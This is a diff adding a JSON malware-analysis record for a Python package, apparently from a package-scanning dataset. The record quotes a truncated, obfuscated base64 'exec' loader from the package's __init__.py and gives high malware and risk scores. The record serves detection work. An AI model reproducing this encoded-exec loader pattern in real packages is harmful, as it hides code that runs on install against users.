@@ -1,0 +1,26 @@
+{
+  "package_metadata": {
+    "name": "xologpbhyminnv",
+    "version": "0.0.0",
+    "author_email": ""
+  },
+  "behavior_analysis": {
+    "file_operations": [],
+    "network_endpoints": [],
+    "process_spawns": []
+  },
+  "malicious_code": {
+    "suspicious_modules": [
+      {
+        "filename": "xologpbhyminnv/__init__.py",
+        "code_snippet": "import base64 as b;exec(b.b64decode('dHJ5OgogICAgX19QWU9fXzAyNTQgPSBsYW1iZGEgeDp4LnJlcGxhY2UoIl9fUFlPX18zOTYzIiwibSIpLnJlcGxhY2UoIl9fUFlPX185NjUxIiwgInAiKS5yZXBsYWNlKCJfX1BZT19fMDc1NCIsICJhIikucmVwbGFjZSgiX19QWU9fXzkzNjQiLCAicyIpLnJlcGxhY2U...HQnKQ=='))"
+      }
+    ]
+  },
+  "threat_assessment": {
+    "malware_score": 0.9,
+    "risk_score": 0.85,
+    "confidence": 0.95,
+    "cwe_ids": ["CWE-94", "CWE-502", "CWE-200"]
+  }
+}
